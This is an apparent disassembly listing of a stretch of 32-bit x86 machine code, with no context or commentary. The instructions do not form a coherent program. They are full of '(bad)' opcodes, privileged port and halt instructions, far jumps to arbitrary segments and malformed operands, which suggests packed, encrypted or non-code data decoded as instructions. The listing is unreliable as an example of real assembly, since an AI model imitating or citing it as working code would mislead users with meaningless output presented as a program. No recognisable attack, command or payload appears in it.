  41aee5:	or     al,0x1
  41aee7:	mov    al,ds:0xf8000097
  41aeec:	pop    es
  41aeed:	iret   
  41aeee:	test   DWORD PTR [eax],ebx
  41aef0:	sti    
  41aef1:	mov    cl,0xfd
  41aef3:	(bad)  
  41aef4:	xchg   esp,eax
  41aef5:	push   ecx
  41aef6:	je     0x41ae80
  41aef8:	fs xor eax,0x7b
  41aefc:	push   ebx
  41aefd:	fwait
  41aefe:	jl     0x41aed8
  41af00:	sti    
  41af01:	add    BYTE PTR [esi+0x5e],dh
  41af04:	and    BYTE PTR [edi+ebx*2],bh
  41af07:	hlt    
  41af08:	out    0x2a,al
  41af0a:	mov    eax,esi
  41af0c:	jmp    FWORD PTR [ecx+0x63]
  41af0f:	dec    ebx
  41af10:	inc    ebx
  41af11:	lods   eax,DWORD PTR ds:[esi]
  41af12:	in     eax,0xc8
  41af14:	xor    DWORD PTR [ebx+0xfe67473],ebp
  41af1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af1b:	cwde   
  41af1c:	xchg   BYTE PTR [edx+eiz*4],ch
  41af1f:	in     al,dx
  41af20:	lods   al,BYTE PTR ds:[esi]
  41af21:	dec    eax
  41af22:	mov    ecx,0xdd3fbde4
  41af27:	ret    0x4c5d
  41af2a:	xor    al,0x31
  41af2c:	xchg   BYTE PTR [eax+0x791c4aea],al
  41af32:	pusha  
  41af33:	push   ebp
  41af34:	iret   
  41af35:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41af37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af38:	ffree  st(4)
  41af3a:	jmp    0xd084:0xd6dec337
  41af41:	sar    BYTE PTR [ebp+0x7184f64f],0x8d
  41af48:	xchg   ebx,eax
  41af49:	and    DWORD PTR [ecx+ebx*1],esp
  41af4c:	jae    0x41af31
  41af4e:	imul   eax,DWORD PTR [ebx+0x48],0x608566c5
  41af55:	xor    ebx,DWORD PTR [esi+0x3ecbc968]
  41af5b:	cmc    
  41af5c:	xchg   bl,bh
  41af5e:	jbe    0x41af53
  41af60:	adc    DWORD PTR [ecx+0x2a23a10],esp
  41af66:	ret    
  41af67:	int    0xc2
  41af69:	push   esi
  41af6a:	lods   eax,DWORD PTR ds:[esi]
  41af6b:	xor    dl,al
  41af6d:	xchg   BYTE PTR [ecx],bh
  41af6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af70:	xor    esp,DWORD PTR [esi]
  41af72:	addr16 fwait
  41af74:	push   cs
  41af75:	xor    al,0x24
  41af77:	xor    al,0x2d
  41af79:	jae    0x41afdf
  41af7b:	mov    DWORD PTR [ecx-0x7895b29a],0x31f856ae
  41af85:	inc    esp
  41af86:	sub    BYTE PTR [edx],dl
  41af88:	xor    BYTE PTR [ebx+0x1d],al
  41af8b:	je     0x41af41
  41af8d:	sub    ebp,edx
  41af8f:	mov    edi,0xae1c4950
  41af94:	xchg   esi,eax
  41af95:	adc    dh,BYTE PTR [edi-0x2]
  41af98:	sub    ecx,0x13
  41af9b:	cmp    bh,bh
  41af9d:	jne    0x41afc6
  41af9f:	int    0xb4
  41afa1:	pop    esi
  41afa2:	clc    
  41afa3:	mov    ch,0x31
  41afa5:	fcomip st,st(0)
  41afa7:	mov    al,0x61
  41afa9:	cmc    
  41afaa:	hlt    
  41afab:	mov    ch,0x11
  41afad:	and    edx,DWORD PTR cs:[edx+0x72]
  41afb1:	shl    dl,cl
  41afb3:	xor    eax,0x10af2546
  41afb8:	or     DWORD PTR [esi],esi
  41afba:	hlt    
  41afbb:	mov    ch,0x91
  41afbd:	jmp    0x41af50
  41afbf:	mov    ebp,DWORD PTR [edx-0x57273cf0]
  41afc5:	xor    al,0x77
  41afc7:	pop    es
  41afc8:	xchg   BYTE PTR [ebp+0x708feea6],dh
  41afce:	adc    eax,0x83bd8c9b
  41afd3:	pushw  es
  41afd5:	add    BYTE PTR [ebp-0x8340275],ah
  41afdb:	(bad)  
  41afdc:	dec    edx
  41afdd:	(bad)  
  41afde:	inc    esi
  41afdf:	cmp    al,0xfd
  41afe1:	mov    bh,0xc8
  41afe3:	rcr    ebp,1
  41afe5:	out    dx,eax
  41afe6:	xlat   BYTE PTR ds:[ebx]
  41afe7:	dec    ecx
  41afe8:	stos   BYTE PTR es:[edi],al
  41afe9:	sbb    DWORD PTR [ecx-0x6da97a58],edx
  41afef:	stc    
  41aff0:	inc    ebp
  41aff2:	push   0x329942fc
  41aff7:	dec    edi
  41aff8:	push   0x49ff75a0
  41affd:	cdq    
  41affe:	sbb    BYTE PTR [edi-0x4e],dh
  41b001:	pusha  
  41b002:	inc    esp
  41b003:	fcmovne st,st(4)
  41b005:	push   ss
  41b006:	add    edx,DWORD PTR [ecx]
  41b008:	mov    ebp,0x64bbe24
  41b00d:	jo     0x41afe4
  41b00f:	bound  esi,QWORD PTR [ebx+0x68]
  41b012:	fucomip st,st(6)
  41b014:	(bad)  
  41b017:	jmp    0xc717:0xda0fcd7c
  41b01e:	lods   eax,DWORD PTR ds:[esi]
  41b01f:	pop    ecx
  41b020:	pop    ecx
  41b021:	dec    ebp
  41b022:	xlat   BYTE PTR ds:[ebx]
  41b023:	mov    al,0xa5
  41b025:	push   esp
  41b026:	sar    ebp,1
  41b028:	pusha  
  41b029:	mov    dl,0xa8
  41b02b:	xchg   esp,eax
  41b02c:	and    DWORD PTR [edi+edi*1-0x53d67ce8],ebx
  41b033:	lods   eax,DWORD PTR ds:[esi]
  41b034:	push   es
  41b035:	pop    edx
  41b036:	jb     0x41afe2
  41b038:	adc    DWORD PTR [ebx],edi
  41b03a:	dec    esi
  41b03b:	or     BYTE PTR [edi-0x3060f7ad],cl
  41b041:	xchg   ecx,eax
  41b042:	stos   BYTE PTR es:[edi],al
  41b043:	dec    ebp
  41b044:	pop    ecx
  41b045:	push   edx
  41b046:	cs mov eax,0x7b5392c7
  41b04c:	outs   dx,DWORD PTR ds:[esi]
  41b04d:	sub    BYTE PTR [ebx+0x353fbfc2],dl
  41b053:	push   ecx
  41b054:	jp     0x41afe6
  41b056:	sub    DWORD PTR [ecx+0x32511006],0xbc8f1b3b
  41b060:	jmp    0xc9d5284f
  41b065:	adc    cl,BYTE PTR [edx+0x60]
  41b068:	xor    al,0xfa
  41b06a:	stc    
  41b06b:	popf   
  41b06c:	xor    DWORD PTR [ecx-0xf],esi
  41b06f:	pop    esi
  41b070:	outs   dx,BYTE PTR ds:[esi]
  41b071:	aaa    
  41b072:	jmp    0x41b0ae
  41b074:	enter  0x75d4,0xfd
  41b078:	mov    al,0xd3
  41b07a:	arpl   WORD PTR [edx-0x40],sp
  41b07d:	pop    esi
  41b07e:	addr16 xor ch,ch
  41b081:	cmp    cl,ah
  41b083:	xor    BYTE PTR [esi],0xbc
  41b086:	xchg   ecx,eax
  41b087:	gs jg  0x41b06d
  41b08a:	jl     0x41b083
  41b08c:	icebp  
  41b08d:	mov    al,ds:0x31bb5e87
  41b092:	rcr    BYTE PTR [eax+0x71e723cc],1
  41b098:	(bad)
  41b09c:	shl    al,1
  41b09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b09f:	mov    cl,0x69
  41b0a1:	dec    esp
  41b0a2:	mov    bl,0xd9
  41b0a4:	jge    0x41b05e
  41b0a6:	sub    esp,esp
  41b0a8:	pop    ds
  41b0a9:	push   edx
  41b0aa:	imul   esp,DWORD PTR [esi+0x2aa02dff],0x94a455cd
  41b0b4:	lea    eax,[esi]
  41b0b6:	data16 sbb cl,BYTE PTR [ebx+0x44]
  41b0ba:	in     eax,0x1f
  41b0bc:	pop    edx
  41b0bd:	loopne 0x41b07f
  41b0bf:	sar    cl,cl
  41b0c1:	sbb    esp,DWORD PTR [edi+0x3ff29eff]
  41b0c7:	test   DWORD PTR [esi-0x5e],ecx
  41b0ca:	ins    BYTE PTR es:[edi],dx
  41b0cb:	cwde   
  41b0cc:	sbb    al,0x55
  41b0ce:	inc    ebp
  41b0cf:	xchg   ebp,eax
  41b0d0:	fnstsw WORD PTR [esi+edx*1]
  41b0d3:	sbb    eax,0x27faf7ce
  41b0d8:	mov    al,0x24
  41b0da:	mov    eax,ds:0x841ebb75
  41b0df:	bound  edx,QWORD PTR [ecx-0x2]
  41b0e2:	jae    0x41b090
  41b0e4:	sbb    ah,BYTE PTR [edi+edx*8]
  41b0e7:	pushf  
  41b0e8:	and    eax,0x62d5cdca
  41b0ed:	aaa    
  41b0ee:	std    
  41b0ef:	inc    edx
  41b0f0:	sbb    dl,BYTE PTR [esi]
  41b0f2:	retf   
  41b0f3:	cld    
  41b0f4:	add    DWORD PTR [edi+eax*2],0xffffffbb
  41b0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0f9:	pop    ebx
  41b0fa:	mov    eax,ds:0xcd0df4e6
  41b0ff:	jmp    0x7967305f
  41b104:	pop    ebp
  41b105:	out    dx,eax
  41b106:	jo     0x41b169
  41b108:	xor    edi,DWORD PTR [esp+esi*1+0x86400a8]
  41b10f:	test   BYTE PTR [eax+0x5c1114b3],0xe4
  41b116:	aam    0x7e
  41b118:	imul   esi,DWORD PTR [edi+ebx*2-0x1d],0xdf0cf05d
  41b120:	adc    eax,0xdc7bf73
  41b125:	popf   
  41b126:	repnz gs dec ebx
  41b129:	cmp    ebp,DWORD PTR [ebx-0x3e]
  41b12c:	push   esp
  41b12d:	xchg   BYTE PTR [edi-0x3d],ch
  41b130:	adc    al,0xf1
  41b132:	adc    al,0x54
  41b134:	add    BYTE PTR [eax],dl
  41b136:	push   edx
  41b137:	shl    BYTE PTR [ecx],cl
  41b139:	out    dx,al
  41b13a:	fwait
  41b13b:	inc    ecx
  41b13c:	ror    eax,cl
  41b13e:	mov    ds:0x5a79737b,al
  41b143:	ret    0x5175
  41b146:	stc    
  41b147:	je     0x41b17c
  41b149:	fisttp DWORD PTR [edx+0x33]
  41b14c:	out    dx,al
  41b14d:	dec    eax
  41b14e:	fst    DWORD PTR [ebp+0xcf53c3c]
  41b154:	sar    DWORD PTR [eax],0x63
  41b157:	inc    ebx
  41b158:	xchg   ebx,eax
  41b159:	pop    esp
  41b15a:	(bad)  
  41b15b:	mov    eax,0xf1ae4e87
  41b160:	inc    ebx
  41b161:	std    
  41b162:	sbb    eax,0xad5aa0da
  41b167:	leave  
  41b168:	sbb    DWORD PTR [ebx+0x16],ebx
  41b16b:	inc    edx
  41b16c:	cs inc ebp
  41b16e:	sbb    BYTE PTR [edi],ah
  41b170:	fisttp DWORD PTR [ebx+0x2c4ba2a0]
  41b176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b177:	lock jno 0x41b114
  41b17a:	mov    ch,0x54
  41b17c:	shl    BYTE PTR [esi+ebx*4],1
  41b17f:	ffree  st(0)
  41b181:	jbe    0x41b105
  41b183:	popf   
  41b184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b185:	adc    ch,cl
  41b187:	push   eax
  41b188:	xchg   edi,eax
  41b189:	pop    esi
  41b18a:	lahf   
  41b18b:	neg    BYTE PTR [ebx]
  41b18d:	dec    edi
  41b18e:	aad    0x16
  41b190:	test   DWORD PTR [eax-0x70],0x89ac702
  41b197:	pop    ds
  41b198:	jle    0x41b12c
  41b19a:	repnz ror DWORD PTR [esi*1+0x67e66a95],cl
  41b1a2:	pop    eax
  41b1a3:	mov    ah,0xed
  41b1a5:	(bad)  
  41b1a7:	cmp    eax,0x5efb70ef
  41b1ac:	push   0x78
  41b1ae:	mov    ?,WORD PTR [edi-0x12]
  41b1b1:	inc    edi
  41b1b2:	in     eax,0x54
  41b1b4:	int    0x82
  41b1b6:	rol    DWORD PTR [ebx+0x439ccb8d],0x54
  41b1bd:	pop    ds
  41b1be:	es inc ecx
  41b1c0:	ret    
  41b1c1:	push   0xa90fdbfc
  41b1c6:	mov    ah,0x8d
  41b1c8:	(bad)  
  41b1c9:	int    0x18
  41b1cb:	cmp    BYTE PTR [edi-0x62],0xa3
  41b1cf:	jns    0x41b19e
  41b1d1:	test   DWORD PTR [edi+0x42],ebx
  41b1d4:	sub    BYTE PTR [esi+0x4f],dl
  41b1d7:	mov    bh,0xc7
  41b1d9:	pusha  
  41b1da:	sub    ebx,0x67ad3e34
  41b1e0:	retf   0x4473
  41b1e3:	cwde   
  41b1e4:	fnstcw WORD PTR [ebp+esi*2-0x39169e37]
  41b1eb:	das    
  41b1ec:	jnp    0x41b1f3
  41b1ee:	fsin   
  41b1f0:	in     eax,dx
  41b1f1:	add    eax,0x908513f7
  41b1f6:	pop    es
  41b1f7:	out    dx,al
  41b1f8:	jo     0x41b1b5
  41b1fa:	push   eax
  41b1fb:	in     eax,dx
  41b1fc:	repz push esi
  41b1fe:	push   ebp
  41b1ff:	call   0x776:0xe091d7f4
  41b206:	and    BYTE PTR [ecx],dl
  41b208:	push   eax
  41b209:	pop    eax
  41b20a:	(bad)  [ebx-0x908ff35]
  41b210:	xchg   esp,eax
  41b211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b212:	inc    esi
  41b213:	outs   dx,BYTE PTR ds:[esi]
  41b214:	icebp  
  41b215:	in     eax,0xa4
  41b217:	fdivr  st(2),st
  41b219:	jp     0x41b217
  41b21b:	loop   0x41b217
  41b21d:	stos   DWORD PTR es:[edi],eax
  41b21e:	fsubr  QWORD PTR [edx+0x5]
  41b221:	daa    
  41b222:	fisttp WORD PTR ds:[esi]
  41b225:	shr    BYTE PTR [ecx],1
  41b227:	mov    fs:0xea9a5790,al
  41b22d:	test   DWORD PTR [esi-0x614d163a],edx
  41b233:	mov    edi,0xb21d247
  41b238:	xor    BYTE PTR [ecx+0x5a],0x7b
  41b23c:	int3   
  41b23d:	test   DWORD PTR [eax],ebp
  41b23f:	add    al,0xb2
  41b241:	inc    ebx
  41b242:	(bad)  
  41b243:	dec    dh
  41b245:	mov    edi,0x823f3ad
  41b24a:	xchg   edx,eax
  41b24b:	stos   DWORD PTR es:[edi],eax
  41b24c:	pop    esp
  41b24d:	es xor ecx,edi
  41b250:	jecxz  0x41b20d
  41b252:	arpl   ax,bp
  41b254:	popf   
  41b255:	retf   0xa42d
  41b258:	enter  0xc312,0x32
  41b25c:	inc    esp
  41b25d:	xchg   ebp,eax
  41b25e:	pushf  
  41b25f:	push   ds
  41b260:	inc    esi
  41b261:	xchg   edx,eax
  41b262:	mov    ebx,0xc7e09edd
  41b267:	iret   
  41b268:	(bad)  
  41b269:	jecxz  0x41b238
  41b26b:	cmp    eax,0xb94e1f19
  41b270:	xor    esp,esi
  41b272:	mov    bh,0x4f
  41b274:	push   es
  41b275:	sti    
  41b276:	push   esp
  41b277:	push   es
  41b278:	repz sbb DWORD PTR [edx-0x353614e0],ebx
  41b27f:	or     dl,BYTE PTR [ebx+ecx*1]
  41b282:	inc    ebp
  41b283:	cmp    ebx,DWORD PTR [eax-0x21656c69]
  41b289:	test   DWORD PTR [edi+0x1c34dc93],0xcfc790f3
  41b293:	adc    ebx,esi
  41b295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b296:	xor    al,0xdb
  41b298:	hlt    
  41b299:	push   ecx
  41b29a:	aaa    
  41b29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b29c:	mov    ebp,0x742d7e66
  41b2a1:	retf   0xcca6
  41b2a4:	jecxz  0x41b289
  41b2a6:	push   ss
  41b2a7:	cmp    BYTE PTR [esp+esi*1+0x1ee3ac09],al
  41b2ae:	retf   0x1083
  41b2b1:	mov    WORD PTR [ebx],ds
  41b2b3:	push   ecx
  41b2b4:	sti    
  41b2b5:	pop    eax
  41b2b6:	mov    ch,0x1
  41b2b8:	jo     0x41b2c1
  41b2ba:	xor    eax,0x199cba7c
  41b2bf:	mov    eax,0x795241c2
  41b2c4:	ins    BYTE PTR es:[edi],dx
  41b2c5:	pop    ss
  41b2c6:	jb     0x41b29d
  41b2c8:	sbb    eax,0xf6e78b0e
  41b2cd:	mov    al,0xea
  41b2cf:	mov    ?,WORD PTR [esi]
  41b2d1:	retf   
  41b2d2:	lds    ebx,FWORD PTR [ecx+0x77]
  41b2d5:	loopne 0x41b346
  41b2d7:	mov    ebp,0xc9680947
  41b2dc:	fld    DWORD PTR [ebx+0x1b049753]
  41b2e2:	fld    st(1)
  41b2e4:	mov    bh,0x1d
  41b2e6:	out    dx,eax
  41b2e7:	ins    BYTE PTR es:[edi],dx
  41b2e8:	cld    
  41b2e9:	cmp    DWORD PTR [esi+0x7606347f],edi
  41b2ef:	out    0x6e,eax
  41b2f1:	xor    al,0xd8
  41b2f3:	push   ebx
  41b2f4:	ds out dx,eax
  41b2f6:	ror    DWORD PTR [ebp+0x57],0x1c
  41b2fa:	or     eax,0xbaeb9edf
  41b2ff:	pop    edi
  41b300:	cmp    eax,0x5b96aa8b
  41b305:	repnz mov bh,bl
  41b308:	adc    BYTE PTR [ebp+ebx*2+0x39],0xb0
  41b30d:	test   eax,0xc6bbdacf
  41b312:	psrad  mm0,QWORD PTR [ebx+0x71fec86d]
  41b319:	fld    QWORD PTR [esp+ecx*2]
  41b31c:	and    BYTE PTR [edx+0x4],al
  41b31f:	aad    0xe8
  41b321:	and    eax,0xe0591742
  41b326:	mov    edi,0xa6379c37
  41b32b:	inc    esi
  41b32c:	pop    edx
  41b32d:	xlat   BYTE PTR ds:[ebx]
  41b32e:	mov    edx,0x7a11febf
  41b333:	push   ecx
  41b334:	and    DWORD PTR [edi-0x2b],ebp
  41b337:	jae    0x41b324
  41b339:	scas   eax,DWORD PTR es:[edi]
  41b33a:	cli    
  41b33b:	cmp    BYTE PTR [eax],dl
  41b33d:	in     eax,dx
  41b33e:	daa    
  41b33f:	addr16 mov ah,0x76
  41b342:	add    cl,BYTE PTR [ecx+0x3d527c38]
  41b348:	and    al,0x28
  41b34a:	pop    ds
  41b34b:	popf   
  41b34c:	enter  0x248a,0x45
  41b350:	push   cs
  41b351:	pusha  
  41b352:	js     0x41b2f5
  41b354:	inc    esi
  41b355:	xchg   ebp,eax
  41b356:	call   0x3175aec5
  41b35b:	xchg   esp,eax
  41b35c:	sbb    dl,BYTE PTR [edi+esi*4-0xc310031]
  41b363:	ins    BYTE PTR es:[edi],dx
  41b364:	sub    eax,edi
  41b366:	inc    edx
  41b367:	jmp    0xa57124e0
  41b36c:	in     eax,0x9b
  41b36e:	xchg   ecx,eax
  41b36f:	mov    dh,0xdd
  41b371:	ret    
  41b372:	aas    
  41b373:	mov    dh,0x85
  41b375:	add    al,BYTE PTR [ecx+eax*1-0x68b83730]
  41b37c:	clc    
  41b37d:	push   cs
  41b37e:	push   ecx
  41b37f:	cmp    dl,BYTE PTR [eiz*8+0xba49662]
  41b386:	inc    esp
  41b387:	rol    edx,cl
  41b389:	mov    DWORD PTR [edi-0x655dd354],esi
  41b38f:	inc    edx
  41b390:	call   0xb3f5b64b
  41b395:	shl    BYTE PTR [ebp+ecx*8+0x64],0xd3
  41b39a:	aas    
  41b39b:	xchg   ecx,eax
  41b39c:	adc    DWORD PTR [eax+ecx*8-0x7fc6f3f0],ebp
  41b3a3:	push   eax
  41b3a4:	(bad)  
  41b3a5:	sti    
  41b3a6:	adc    al,BYTE PTR [ebp+0x48]
  41b3a9:	push   0x6384150d
  41b3ae:	das    
  41b3af:	sbb    bl,bh
  41b3b1:	repz sub ch,BYTE PTR [ebx+0x5fb44ee9]
  41b3b8:	fcmovnb st,st(1)
  41b3ba:	mov    bl,0x43
  41b3bc:	test   BYTE PTR [ebx+0x5fc01f7],al
  41b3c2:	xchg   ebp,eax
  41b3c3:	idiv   DWORD PTR [edi]
  41b3c5:	(bad)  
  41b3c6:	jmp    0x8704:0x9d99514e
  41b3cd:	push   ebp
  41b3ce:	aad    0xf3
  41b3d0:	popa   
  41b3d1:	inc    esi
  41b3d2:	es jecxz 0x41b43b
  41b3d5:	xchg   ebx,edx
  41b3d7:	inc    ebp
  41b3d8:	popa   
  41b3d9:	aam    0xc
  41b3db:	push   ebp
  41b3dc:	mov    ebx,0x6f91ded9
  41b3e1:	and    al,0xae
  41b3e3:	ins    BYTE PTR es:[edi],dx
  41b3e4:	(bad)
  41b3e7:	add    dl,BYTE PTR [ecx-0x5d85348d]
  41b3ed:	jbe    0x41b45e
  41b3ef:	mov    al,0xfb
  41b3f1:	gs jmp 0x41b3fa
  41b3f4:	pop    esp
  41b3f5:	mov    ecx,0x716d066
  41b3fa:	xor    eax,0xc79dcb23
  41b3ff:	jmp    0x86a5:0x3cdd3609
  41b406:	and    DWORD PTR [edx-0x5f],edi
  41b409:	pop    ebp
  41b40a:	(bad)  
  41b40b:	rol    DWORD PTR [ebx-0x62eae9f0],0x8a
  41b412:	je     0x41b3d5
  41b414:	pop    ebx
  41b415:	inc    esi
  41b416:	or     cl,BYTE PTR [esi]
  41b418:	sub    BYTE PTR [esi-0x5aec12e0],ah
  41b41e:	fsubr  st(7),st
  41b420:	xchg   esp,eax
  41b421:	inc    eax
  41b422:	ret    
  41b423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b424:	add    edx,DWORD PTR [edi]
  41b426:	out    dx,al
  41b427:	cmp    eax,0x1f87b678
  41b42c:	cli    
  41b42d:	inc    ecx
  41b42e:	sar    DWORD PTR [ecx+ecx*1+0x646ec72a],1
  41b435:	jecxz  0x41b407
  41b437:	int    0xf4
  41b439:	jnp    0x41b49b
  41b43b:	cmp    DWORD PTR [edi],edx
  41b43d:	jg     0x41b410
  41b43f:	jg     0x41b484
  41b441:	xor    BYTE PTR [ebx-0x13dd1ba5],ch
  41b447:	pop    ds
  41b448:	(bad)  
  41b449:	pop    edx
  41b44a:	inc    ecx
  41b44b:	je     0x41b44f
  41b44d:	js     0x41b472
  41b44f:	and    eax,0x60537dcb
  41b454:	sbb    al,BYTE PTR [edi+0x39]
  41b457:	loopne 0x41b455
  41b459:	imul   esi,DWORD PTR [esi+eiz*8-0x59],0x48c4ce91
  41b461:	cmp    edi,DWORD PTR ds:0xb072848a
  41b467:	adc    cl,BYTE PTR [ecx-0xf]
  41b46a:	mov    dh,0xba
  41b46c:	sbb    bh,ah
  41b46e:	in     al,dx
  41b46f:	lock mov esi,0xc6b23f5d
  41b475:	scas   eax,DWORD PTR es:[edi]
  41b476:	int3   
  41b477:	jbe    0x41b450
  41b479:	sbb    eax,0x2bc8dc70
  41b47e:	xor    cl,cl
  41b480:	shl    DWORD PTR [ebx+eax*4],1
  41b483:	push   esp
  41b484:	rol    BYTE PTR [edx-0xc],1
  41b487:	lds    ecx,FWORD PTR [eax-0x2e]
  41b48a:	mov    ds:0xbd5dc8e3,al
  41b48f:	ret    0x163f
  41b492:	cmp    dl,bl
  41b494:	std    
  41b495:	adc    eax,0x1b2931bb
  41b49a:	mov    ch,0x84
  41b49c:	dec    edi
  41b49d:	jne    0x41b482
  41b49f:	outs   dx,BYTE PTR ds:[esi]
  41b4a0:	pop    eax
  41b4a1:	dec    ecx
  41b4a2:	and    eax,0x1a434312
  41b4a7:	das    
  41b4a8:	sbb    DWORD PTR [edi+0x42cfe4a],edi
  41b4ae:	and    DWORD PTR [ecx],edx
  41b4b0:	pop    ebx
  41b4b1:	les    eax,FWORD PTR [ecx-0x2bd6ecba]
  41b4b7:	and    ah,bh
  41b4b9:	jbe    0x41b444
  41b4bb:	sub    bl,0xc6
  41b4be:	sti    
  41b4bf:	mov    bh,0x21
  41b4c1:	outs   dx,DWORD PTR ds:[esi]
  41b4c2:	out    0xa,al
  41b4c4:	test   al,0xe6
  41b4c6:	xor    cl,BYTE PTR [edi-0xc]
  41b4c9:	push   eax
  41b4ca:	(bad)  
  41b4cb:	lock mov cl,0xcd
  41b4ce:	inc    esi
  41b4cf:	stos   BYTE PTR es:[edi],al
  41b4d0:	addr16 xchg esp,eax
  41b4d2:	pop    edi
  41b4d3:	lahf   
  41b4d4:	out    0xe7,al
  41b4d6:	add    BYTE PTR [ecx],bl
  41b4d8:	push   ds
  41b4d9:	mov    ?,WORD PTR [edx+0x35]
  41b4dc:	xor    BYTE PTR [ebp-0x63],bl
  41b4df:	xlat   BYTE PTR ds:[ebx]
  41b4e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4e1:	mov    dh,0x8d
  41b4e3:	das    
  41b4e4:	mov    DWORD PTR [ecx-0x5a284e3c],ebx
  41b4ea:	stos   BYTE PTR es:[edi],al
  41b4eb:	int    0xde
  41b4ed:	fbstp  TBYTE PTR [esi-0x1d]
  41b4f0:	fdivr  st,st(2)
  41b4f2:	mov    bh,0x2a
  41b4f4:	mov    ds:0x718fb9e2,al
  41b4f9:	dec    ecx
  41b4fa:	test   eax,0x1a470a41
  41b4ff:	gs sbb bh,ch
  41b502:	add    al,0x8c
  41b504:	push   0xffffff8c
  41b506:	fdivrp st(7),st
  41b508:	add    al,0x7b
  41b50a:	out    0xfa,eax
  41b50c:	(bad)  
  41b50d:	pop    esi
  41b50e:	in     eax,dx
  41b50f:	xchg   ecx,eax
  41b510:	repz mov es,esi
  41b513:	or     bh,BYTE PTR [ebx]
  41b515:	or     eax,0x5f90e355
  41b51a:	and    eax,DWORD PTR [ecx-0x65]
  41b51d:	fucomi st,st(6)
  41b51f:	test   al,0x46
  41b521:	mov    es:0xe109a00d,eax
  41b527:	and    BYTE PTR [ecx-0x110a493b],dh
  41b52d:	mov    ebx,0xd77f1cdf
  41b532:	out    0xc6,al
  41b534:	xchg   ebx,eax
  41b535:	and    ebx,eax
  41b537:	test   DWORD PTR [edx+0x12],esp
  41b53a:	scas   al,BYTE PTR es:[edi]
  41b53b:	cdq    
  41b53c:	mov    al,0x1d
  41b53e:	mov    eax,ds:0x6b6c9e67
  41b543:	imul   edx,ebx,0x77
  41b546:	or     ecx,DWORD PTR [edi]
  41b548:	rol    DWORD PTR [edx],1
  41b54a:	je     0x41b4ee
  41b54c:	adc    DWORD PTR [ebx],edi
  41b54e:	mov    bh,0xe5
  41b550:	icebp  
  41b551:	fild   DWORD PTR [eax-0x47]
  41b554:	sub    al,0x43
  41b556:	rcl    DWORD PTR [edi+0x3ba6f32],1
  41b55c:	leave  
  41b55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b55e:	jp     0x41b569
  41b560:	pop    ss
  41b561:	in     al,0x75
  41b563:	scas   al,BYTE PTR es:[edi]
  41b564:	xchg   edx,eax
  41b565:	shl    BYTE PTR [ebx+0x4b],0x4
  41b569:	jae    0x41b5d9
  41b56b:	shl    BYTE PTR [ebx+0x66],1
  41b56e:	xchg   esp,eax
  41b56f:	mov    cl,BYTE PTR [ebx+0x4631db7e]
  41b575:	jb     0x41b5b9
  41b577:	mov    dh,0xe1
  41b579:	sub    ebx,ebx
  41b57b:	mov    WORD PTR [edi+0x1c],fs
  41b57e:	jae    0x41b516
  41b580:	lods   al,BYTE PTR ds:[esi]
  41b581:	popa   
  41b582:	aas    
  41b583:	mov    cl,BYTE PTR [esi-0x1ff47ca6]
  41b589:	push   esp
  41b58a:	es out 0x11,eax
  41b58d:	call   0xdd82:0x6a41382f
  41b594:	out    dx,al
  41b595:	mov    edx,0x68f22db9
  41b59a:	lock popa 
  41b59c:	leave  
  41b59d:	pop    esp
  41b59e:	adc    esp,ebx
  41b5a0:	call   0xf892bb2e
  41b5a5:	retf   0xa771
  41b5a8:	push   edx
  41b5a9:	dec    edx
  41b5aa:	jb     0x41b5bf
  41b5ac:	and    eax,0x279bba97
  41b5b1:	les    eax,FWORD PTR [eax+0x516c90b8]
  41b5b7:	das    
  41b5b8:	push   ds
  41b5b9:	xchg   BYTE PTR ds:0x8dcb8ace,bh
  41b5bf:	jp     0x41b579
  41b5c1:	lods   al,BYTE PTR ds:[esi]
  41b5c2:	(bad)  
  41b5c4:	dec    BYTE PTR ds:0x4ec4b54
  41b5ca:	or     esi,DWORD PTR [ebx+ecx*2+0x2671552a]
  41b5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5d2:	(bad)  
  41b5d3:	fucomp st(2)
  41b5d5:	xchg   BYTE PTR [ebx],dl
  41b5d7:	sub    al,0x3
  41b5d9:	inc    esi
  41b5da:	adc    al,0x4e
  41b5dc:	add    BYTE PTR [ecx],al
  41b5de:	adc    bh,BYTE PTR [edx]
  41b5e0:	hlt    
  41b5e1:	fs jg  0x41b5c2
  41b5e4:	add    eax,DWORD PTR [edi-0x3a130ba1]
  41b5ea:	ret    
  41b5eb:	call   0x86720f5d
  41b5f0:	pop    es
  41b5f1:	pop    ss
  41b5f2:	pop    edi
  41b5f3:	inc    edx
  41b5f4:	mov    ecx,0x6943c40e
  41b5f9:	clc    
  41b5fa:	ficom  WORD PTR [ebp+0x3507bf7e]
  41b600:	rep lods eax,DWORD PTR ds:[esi]
  41b602:	jne    0x41b674
  41b604:	mov    cl,0xb6
  41b606:	cs xchg edi,eax
  41b608:	daa    
  41b609:	add    BYTE PTR [edi-0x2d6c0bef],dl
  41b60f:	icebp  
  41b610:	or     BYTE PTR [esp+ebp*2+0x64],0xe0
  41b615:	sbb    cl,BYTE PTR [ebx]
  41b617:	push   es
  41b618:	mov    ch,0x18
  41b61a:	sti    
  41b61b:	mov    cl,0x7f
  41b61d:	psllq  mm7,QWORD PTR [ebx-0x3e]
  41b621:	jns    0x41b67b
  41b623:	fs dec eax
  41b625:	xor    ah,BYTE PTR [edi+esi*8]
  41b628:	popf   
  41b629:	ins    DWORD PTR es:[edi],dx
  41b62a:	scas   al,BYTE PTR es:[edi]
  41b62b:	out    dx,eax
  41b62c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b62d:	adc    al,0xe3
  41b62f:	es xchg edx,eax
  41b631:	xchg   esp,eax
  41b632:	(bad)  
  41b633:	fcmovu st,st(5)
